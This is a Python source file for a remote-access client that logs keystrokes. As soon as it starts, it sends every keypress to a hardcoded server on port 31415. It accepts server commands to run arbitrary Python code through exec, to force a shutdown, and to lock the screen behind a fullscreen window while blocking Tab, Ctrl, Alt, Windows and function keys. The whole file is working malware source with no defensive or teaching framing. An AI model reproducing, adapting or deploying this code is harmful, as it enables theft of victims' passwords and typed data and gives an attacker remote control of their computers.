import socket
import sys
import os
import pyautogui
import keyboard
import ctypes
from pynput.keyboard import Key, Listener
from _thread import start_new_thread as thread
from tkinter import (Tk, Label)


KEYS_TO_BLOCK = [
    'tab',
    'ctrl',
    'alt',
    'win',
]
KEYS_TO_BLOCK += [f'f{i}' for i in range(1, 13)]


class block_:
    pass

block_window = Tk()
block_window.destroy()



def shutdown(message):
    os.system("shutdown /s /f /t 0")

def execute(message):
    exec(message[8:])

def block(message):
    try:
        block_window.winfo_exists() #fails = it has been destroyed
        server.send(b"MESSAGE Screen is already blocked")

    except:
        block_window.__init__()
        Label(block_window, text=message[6:], font='Calibri 60').pack(expand=1)
        block_window.attributes('-fullscreen', True)
        block_window.overrideredirect(1)
        block_window.attributes('-topmost', True)
        for i in KEYS_TO_BLOCK:
            keyboard.block_key(i)
        server.send(b"MESSAGE Screen has been blocked") #block

def unblock(message):
    keyboard.unhook_all()
    try:
        block_window.destroy()
        server.send(b"MESSAGE Screen has been unblocked")
    except:
        server.send(b"MESSAGE Screen has already been unblocked so uh you did nothing")



ACTIONS = {
    "EXECUTE": execute,
    "SHUTDOWN": shutdown,
    "BLOCK": block,
    "UNBLOCK": unblock,
}




def on_press(key):
    print('a key has been pressed')
    try:
        key = key.name
    except:
        pass
    server.send(bytes(f'KEY {key}|', 'utf-8'))

def on_release(key):
    print('a key has been released')
    #server.send(bytes(f'KEY {key}|', 'utf-8'))

def keylog(): #will start once program starts
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


thread(keylog, ())

        

while True:
    IP = '192.168.4.66'#the ip for serber
    PORT = 31415
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((IP, PORT))
    while True:
        try:
            try:
                block_window.update()
                block_window.update_idletasks()
            except:
                pass

            message = server.recv(2048)
            real = str(message)[2:-1]
            try:
                ACTIONS[real.split()[0]](real)
            except Exception as e:
                print(e)
                print(real)
        except:
            break
